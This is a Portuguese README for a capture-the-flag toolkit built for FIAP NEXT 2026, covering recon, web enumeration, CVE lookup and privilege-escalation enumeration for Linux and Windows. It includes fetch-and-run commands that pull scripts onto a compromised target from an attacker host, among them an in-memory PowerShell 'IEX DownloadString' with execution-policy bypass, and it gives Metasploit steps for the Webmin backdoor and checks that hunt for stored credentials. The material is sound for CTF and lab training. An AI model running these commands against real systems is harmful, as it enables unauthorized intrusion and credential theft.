# CTF Next FIAP

Scripts e guia de referência que montei para o CTF do FIAP NEXT 2026: recon, enumeração, busca de CVE e privesc.

Uso apenas em ambiente autorizado (CTF, laboratório, máquinas próprias).

## Conteúdo

```
scripts/
  recon.sh           recon completo de um alvo (nmap + exploits + enum por serviço)
  web_enum.sh        enumeração web (arquivos clássicos, diretórios, vhosts)
  cve_lookup.py      busca CVEs no NVD por produto/versão ou pelo XML do nmap
  linux_privesc.sh   enumeração de privesc em Linux (roda no alvo)
  win_privesc.ps1    enumeração de privesc em Windows (roda no alvo)
docs/
  CTF_Field_Guide_FIAP_NEXT.pdf    guia completo (nmap, web, exploração, privesc, AD, pivoting)
  CTF_Field_Guide_FIAP_NEXT.docx   mesmo conteúdo em Word
```

## Instalação

```bash
git clone https://github.com/rabelojp41/NextFiap-CTF.git
cd NextFiap-CTF/scripts
chmod +x *.sh *.py

# dependências (Kali)
sudo apt install -y nmap exploitdb seclists ffuf gobuster feroxbuster whatweb smbclient enum4linux-ng
```

Opcional: colocar a pasta no PATH.

```bash
echo "export PATH=\$PATH:$(pwd)" >> ~/.zshrc && source ~/.zshrc
```

## recon.sh

```bash
./recon.sh <IP> [pasta_saida]
./recon.sh 10.10.10.5
./recon.sh 10.10.10.5 alvo1
```

Rode `sudo -v` antes. O script usa sudo para o SYN scan e para o `-O`.

Ordem do que ele faz:

1. ping (se não responder, segue com `-Pn`)
2. `nmap -p- --min-rate 5000` para achar todas as portas TCP abertas
3. `nmap -sV -sC -O` só nas portas abertas
4. em background: `--script vuln` e UDP top 20
5. `searchsploit --nmap` e `cve_lookup.py` com as versões encontradas
6. enum por serviço: HTTP (headers, robots, whatweb, diretórios), SMB (null session, shares, MS17-010), FTP (anônimo + download), SNMP, NFS, LDAP

Arquivos gerados:

| Arquivo | Conteúdo |
|---|---|
| `01_allports.*` | portas abertas |
| `02_detail.nmap` | serviços e versões (ler primeiro) |
| `02_detail.xml` | mesmo resultado em XML |
| `03_vuln.nmap` | resultado dos scripts NSE de vuln |
| `04_udp.nmap` | UDP |
| `05_searchsploit.txt` | exploits do Exploit-DB |
| `06_nvd.txt` | CVEs com CVSS |
| `10_` a `13_` | web (por porta) |
| `20_` a `23_` | SMB |
| `30_`, `31_ftp_dump/` | FTP anônimo |

## web_enum.sh

```bash
./web_enum.sh <url> [dominio]
./web_enum.sh http://10.10.10.5
./web_enum.sh http://10.10.10.5:8080
./web_enum.sh http://alvo.ctf alvo.ctf     # também procura vhosts (dev.alvo.ctf, admin.alvo.ctf...)
```

Faz: headers e tecnologia, teste de arquivos comuns (`.git`, `.env`, `robots.txt`, backups, phpinfo), comentários HTML e arquivos JS, fuzzing de diretórios com ffuf (ou gobuster), fuzzing de vhost se passar o domínio.

Se o ffuf retornar tudo com 200, rode de novo filtrando pelo tamanho repetido (`-fs <tamanho>`) ou use `-ac`.

## cve_lookup.py

```bash
python3 cve_lookup.py "vsftpd 2.3.4"
python3 cve_lookup.py "Apache HTTP Server 2.4.49" --max 10
python3 cve_lookup.py "webmin 1.910" --exploit
python3 cve_lookup.py --nmap recon_10.10.10.5/02_detail.xml
```

| Flag | Função |
|---|---|
| `"termo"` | produto + versão |
| `--nmap arq.xml` | lê todos os serviços com versão do XML do nmap |
| `--max N` | quantas CVEs mostrar por serviço (padrão 8) |
| `--exploit` | também roda searchsploit (automático com `--nmap`) |

Ordena por: CVEs no catálogo KEV da CISA primeiro (exploradas de verdade), depois maior CVSS.

Sem chave de API o NVD limita as requisições, então o script espera 6,5 s entre serviços. Com chave (grátis em nvd.nist.gov/developers):

```bash
export NVD_API_KEY=sua_chave
```

CVE na lista não significa que o alvo está vulnerável. Confira a faixa de versões afetadas e teste com o `check` do Metasploit ou o script NSE da CVE.

## Achar exploit para uma versão (passo a passo)

**1. Pegar a versão.** Do nmap (`-sV`), coluna VERSION:

```
21/tcp  open  ftp   vsftpd 2.3.4
10000/tcp open http MiniServ 1.910 (Webmin httpd)
```

Ou no Metasploit, com os scanners auxiliares:

```
use auxiliary/scanner/smb/smb_version      (ou http/http_version, ssh/ssh_version, ftp/ftp_version)
set RHOSTS <IP>
run
```

**2. searchsploit (Exploit-DB, offline).**

```bash
searchsploit vsftpd 2.3.4           # busca por nome + versão
searchsploit webmin 1.9             # se não achar, encurte a versão
searchsploit -x 49757               # lê o exploit pelo ID (coluna Path)
searchsploit -m 49757               # copia o exploit para a pasta atual
searchsploit --nmap 02_detail.xml   # busca tudo que o nmap achou de uma vez
searchsploit -u                     # atualiza a base
```

A coluna **Path** mostra o tipo: `remote/` (explora pela rede), `local/` (privesc), `webapps/` (aplicação web), `dos/` (derruba o serviço, não serve para CTF). Arquivos `.rb` são módulos do Metasploit.

**3. cve_lookup.py (NVD).**

```bash
python3 cve_lookup.py "vsftpd 2.3.4"
python3 cve_lookup.py --nmap 02_detail.xml
```

Mostra CVE, nota CVSS e descrição. `[KEV]` em vermelho = falha explorada de verdade, normalmente tem PoC público. Pegue o ID (ex.: CVE-2019-15107) e procure no Metasploit e no GitHub:

```bash
msfconsole -q -x "search cve:2019-15107; exit"
# Google/GitHub: "CVE-2019-15107 poc"
```

**4. Confirmar antes de explorar.**

```
use exploit/linux/http/webmin_backdoor
set RHOSTS <IP>
check          # Vulnerable / Appears / Safe / Unknown
run
```

O `check` não mostra versão; ele diz se o alvo parece vulnerável. Nem todo módulo tem `check`. Sem ele, confira a faixa de versões afetadas na descrição da CVE e teste o PoC.

## linux_privesc.sh

Roda no alvo, depois de conseguir shell.

```bash
# Kali, na pasta scripts/
python3 -m http.server 80

# alvo
cd /tmp && wget http://<IP_KALI>/linux_privesc.sh
bash linux_privesc.sh 2>/dev/null | tee enum.txt
```

Checa: grupos privilegiados (docker, lxd, disk, adm), `sudo -l` e versão do sudo, SUID/SGID cruzado com GTFOBins, capabilities, cron e scripts de cron graváveis, `/etc/passwd`/`shadow`/`sudoers` com permissão errada, PATH gravável, credenciais em históricos e arquivos de config, portas internas, processos root, container/docker.sock/NFS, versão do kernel.

Linhas em vermelho (`[!!!]`) são os vetores mais prováveis. Use junto com LinPEAS e pspy.

## win_privesc.ps1

```powershell
# direto da memória
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<IP_KALI>/win_privesc.ps1')"

# ou em disco
iwr http://<IP_KALI>/win_privesc.ps1 -OutFile C:\Windows\Temp\w.ps1
powershell -ep bypass -f C:\Windows\Temp\w.ps1

# evil-winrm
upload win_privesc.ps1
.\win_privesc.ps1
```

Checa: `whoami /priv` (SeImpersonate, SeBackup, SeDebug...), AlwaysInstallElevated, serviços com caminho sem aspas ou binário gravável, credenciais salvas (cmdkey, AutoLogon, histórico do PowerShell, unattend.xml), tarefas agendadas, autorun, portas e software instalado.

## Fluxo no CTF

```bash
sudo nmap -v -p- --min-rate 5000 -Pn -n --open -oA 01_all $IP
ports=$(grep -oP '\d+/open' 01_all.gnmap | cut -d/ -f1 | paste -sd,)
sudo nmap -v -p$ports -sCV -Pn -oA 02_detail $IP
searchsploit --nmap 02_detail.xml
python3 cve_lookup.py --nmap 02_detail.xml
```

Ou só `./recon.sh $IP`, que faz isso tudo.

Guia completo em `docs/`.
